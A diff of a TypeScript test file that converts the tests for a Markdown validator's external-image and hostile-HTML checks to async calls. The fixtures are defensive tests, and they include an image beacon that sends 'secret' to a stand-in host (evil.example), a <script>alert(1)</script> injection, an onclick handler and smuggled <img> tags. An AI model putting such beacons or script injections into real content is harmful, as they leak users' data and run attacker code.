@@ -9,6 +9,8 @@
  * validation run could not observe.
  */
 import { describe, expect, test } from "bun:test";
+import { readFileSync, readdirSync } from "node:fs";
+import { join } from "node:path";
 
 import { parseMarkdown } from "../../src/validation/tier0/markdown";
 
@@ -17,16 +19,23 @@ function bytes(source: string): Uint8Array<ArrayBuffer> {
 }
 
 describe("parseMarkdown — type-agnostic external image disclosure", () => {
-  test("counts a native inline image with an https URL", () => {
-    const result = parseMarkdown(bytes("![beacon](https://evil.example/track.png?d=secret)"));
+  test("shipped Markdown templates with Mermaid fences pass Tier 0", async () => {
+    const templates = join(import.meta.dir, "../../templates");
+    for (const name of readdirSync(templates).filter((file) => file.endsWith(".md"))) {
+      const result = await parseMarkdown(bytes(readFileSync(join(templates, name), "utf8")));
+      expect(result.status, name).toBe("ok");
+    }
+  });
+  test("counts a native inline image with an https URL", async () => {
+    const result = await parseMarkdown(bytes("![beacon](https://evil.example/track.png?d=secret)"));
     expect(result.status).toBe("ok");
     if (result.status === "ok") {
       expect(result.observed.externalImageCount).toBe(1);
     }
   });
 
-  test("counts multiple native inline images with https URLs", () => {
-    const result = parseMarkdown(
+  test("counts multiple native inline images with https URLs", async () => {
+    const result = await parseMarkdown(
       bytes(
         "![one](https://cdn.example/a.png) " +
           "![two](https://cdn.example/b.png) " +
@@ -39,8 +48,8 @@ describe("parseMarkdown — type-agnostic external image disclosure", () => {
     }
   });
 
-  test("does not count native images with relative or data: URLs", () => {
-    const result = parseMarkdown(
+  test("does not count native images with relative or data: URLs", async () => {
+    const result = await parseMarkdown(
       bytes(
         "![local](./relative.png) " +
           "![data](data:image/png;base64,AAA) " +
@@ -53,46 +62,46 @@ describe("parseMarkdown — type-agnostic external image disclosure", () => {
     }
   });
 
-  test("counts a reference-style image whose definition is https", () => {
-    const result = parseMarkdown(bytes("![ref][cdn]\n\n[cdn]: https://cdn.example/ref.png"));
+  test("counts a reference-style image whose definition is https", async () => {
+    const result = await parseMarkdown(bytes("![ref][cdn]\n\n[cdn]: https://cdn.example/ref.png"));
     expect(result.status).toBe("ok");
     if (result.status === "ok") {
       expect(result.observed.externalImageCount).toBe(1);
     }
   });
 
-  test("does not count a reference-style image whose definition is relative", () => {
-    const result = parseMarkdown(bytes("![ref][local]\n\n[local]: ./local.png"));
+  test("does not count a reference-style image whose definition is relative", async () => {
+    const result = await parseMarkdown(bytes("![ref][local]\n\n[local]: ./local.png"));
     expect(result.status).toBe("ok");
     if (result.status === "ok") {
       expect(result.observed.externalImageCount).toBe(0);
     }
   });
 
-  test("counts an image with angle-bracketed autolink URL", () => {
+  test("counts an image with angle-bracketed autolink URL", async () => {
     // CommonMark: `![alt](<https://…>)` is the canonical autolink form
     // for image destinations containing special characters. Marked
     // resolves the URL onto the image token's `href`.
-    const result = parseMarkdown(bytes("![cdn](<https://cdn.example/auto.png>)"));
+    const result = await parseMarkdown(bytes("![cdn](<https://cdn.example/auto.png>)"));
     expect(result.status).toBe("ok");
     if (result.status === "ok") {
       expect(result.observed.externalImageCount).toBe(1);
     }
   });
 
-  test("does not count a `link` (non-image) autolink as an external image", () => {
+  test("does not count a `link` (non-image) autolink as an external image", async () => {
     // A bare `<https://…>` autolink produces a `link` token, not an
     // `image` token. The CSP `img-src` directive does not cover
     // navigation, so this is not an external-image disclosure.
-    const result = parseMarkdown(bytes("https://cdn.example/just-a-link"));
+    const result = await parseMarkdown(bytes("https://cdn.example/just-a-link"));
     expect(result.status).toBe("ok");
     if (result.status === "ok") {
       expect(result.observed.externalImageCount).toBe(0);
     }
   });
 
-  test("counts combined inline + reference + autolink images in one document", () => {
-    const result = parseMarkdown(
+  test("counts combined inline + reference + autolink images in one document", async () => {
+    const result = await parseMarkdown(
       bytes(
         "![one](https://cdn.example/a.png)\n" +
           "![two][ref]\n\n[ref]: https://cdn.example/b.png\n" +
@@ -105,8 +114,8 @@ describe("parseMarkdown — type-agnostic external image disclosure", () => {
     }
   });
 
-  test("raw HTML <img src=https://…> still rejects the document as a hostile smuggled reference", () => {
-    const result = parseMarkdown(
+  test("raw HTML <img src=https://…> still rejects the document as a hostile smuggled reference", async () => {
+    const result = await parseMarkdown(
       bytes('![one](https://cdn.example/a.png)\n<img src="https://cdn.example/b.png">'),
     );
     expect(result.status).toBe("error");
@@ -115,8 +124,8 @@ describe("parseMarkdown — type-agnostic external image disclosure", () => {
     }
   });
 
-  test("does not flag a document with no images", () => {
-    const result = parseMarkdown(bytes("# Title\n\nParagraph.\n"));
+  test("does not flag a document with no images", async () => {
+    const result = await parseMarkdown(bytes("# Title\n\nParagraph.\n"));
     expect(result.status).toBe("ok");
     if (result.status === "ok") {
       expect(result.observed.externalImageCount).toBe(0);
@@ -160,7 +169,7 @@ describe("parseMarkdown — type-agnostic external image disclosure", () => {
  * together.
  */
 describe("parseMarkdown — container recursion is complete", () => {
-  test("counts one image in every container shape Marked emits", () => {
+  test("counts one image in every container shape Marked emits", async () => {
     const source = [
       "# H1 ![h](https://cdn.example/h.png)",
       "",
@@ -185,7 +194,7 @@ describe("parseMarkdown — container recursion is complete", () => {
       "[link wrapping ![li](https://cdn.example/li.png)](https://example.com)",
       "",
     ].join("\n");
-    const result = parseMarkdown(bytes(source));
+    const result = await parseMarkdown(bytes(source));
     expect(result.status).toBe("ok");
     if (result.status === "ok") {
       // 14 images placed (1 per shape × 14 shapes):
@@ -194,11 +203,11 @@ describe("parseMarkdown — container recursion is complete", () => {
     }
   });
 
-  test("red flags (script / on* / external) reach every container shape", () => {
+  test("red flags (script / on* / external) reach every container shape", async () => {
     // SHOULD-B: a `<script>` in a list item must reject the document
     // the same as a top-level smuggled script.
     const listScript = ["- list item with <script>alert(1)</script>", ""].join("\n");
-    expect(parseMarkdown(bytes(listScript)).status).toBe("error");
+    expect((await parseMarkdown(bytes(listScript))).status).toBe("error");
 
     // ...and an `on*=` handler in a table cell.
     const tableOnHandler = [
@@ -207,7 +216,7 @@ describe("parseMarkdown — container recursion is complete", () => {
       '| cell with <button onclick="alert(1)">x</button> |',
       "",
     ].join("\n");
-    expect(parseMarkdown(bytes(tableOnHandler)).status).toBe("error");
+    expect((await parseMarkdown(bytes(tableOnHandler))).status).toBe("error");
 
     // ...and an external `src=` smuggled into a table cell.
     const tableExternal = [
@@ -216,6 +225,6 @@ describe("parseMarkdown — container recursion is complete", () => {
       '| cell with <img src="https://cdn.example/smuggled.png"> |',
       "",
     ].join("\n");
-    expect(parseMarkdown(bytes(tableExternal)).status).toBe("error");
+    expect((await parseMarkdown(bytes(tableExternal))).status).toBe("error");
   });
 });
